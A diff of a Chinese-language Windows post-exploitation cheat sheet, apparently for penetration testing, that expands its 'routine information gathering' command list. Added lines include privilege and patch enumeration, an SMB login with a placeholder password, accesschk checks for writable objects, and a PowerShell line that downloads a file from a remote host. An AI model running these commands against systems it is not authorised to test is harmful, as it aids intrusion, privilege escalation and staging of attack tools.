@@ -124,27 +124,35 @@ wmic product get name,version,vendor
 ## **常规信息搜集**
 
 ```
-systeminfo 查询系统信息
-
-hostname 主机名
-
-net user 查看用户信息
-
-netstat -ano|find "3389" 查看服务pid号
-
-wmic os get caption 查看系统名
-
-wmic qfe get Description,HotFixID,InstalledOn 查看补丁信息
-
-wmic product get name,version 查看当前安装程序
-
-wmic service list brief 查询本机服务
-
-wmic process list brief 查询本机进程
-
-net share 查看本机共享列表
-
-netsh firewall show config 查看防火墙配置
+systeminfo						打印系统信息
+whoami							获得当前用户名
+whoami /priv					当前帐户权限
+ipconfig						网络配置信息
+ipconfig /displaydns			显示DNS缓存
+route print						打印出路由表
+arp -a							打印arp表
+hostname						主机名
+net user						列出用户
+net user UserName				关于用户的信息
+net use \SMBPATH Pa$$w0rd /u:UserName	连接SMB
+net localgroup					列出所有组
+net localgroup GROUP			关于指定组的信息
+net view \127.0.0.1				会话打开到当前计算机
+net session						开放给其他机器
+netsh firewall show config		显示防火墙配置
+DRIVERQUERY						列出安装的驱动
+tasklist /svc					列出服务任务
+net start						列出启动的服务
+dir /s foo					在目录中搜索包含指定字符的项目
+dir /s foo == bar			同上
+sc query						列出所有服务
+sc qc ServiceName				找到指定服务的路径
+shutdown /r /t 0				立即重启
+type file.txt					打印出内容
+icacls “C:\Example”				列出权限
+wmic qfe get Caption,Description,HotFixID,InstalledOn	列出已安装的布丁
+(New-Object System.Net.WebClient).DownloadFile(“http://host/file”,”C:\LocalPath”)				利用ps远程下载文件到本地
+accesschk.exe -qwsu “Group”	修改对象（尝试Everyone，Authenticated Users和/或Users）
 ```
 
 ## 常见的杀软如下：
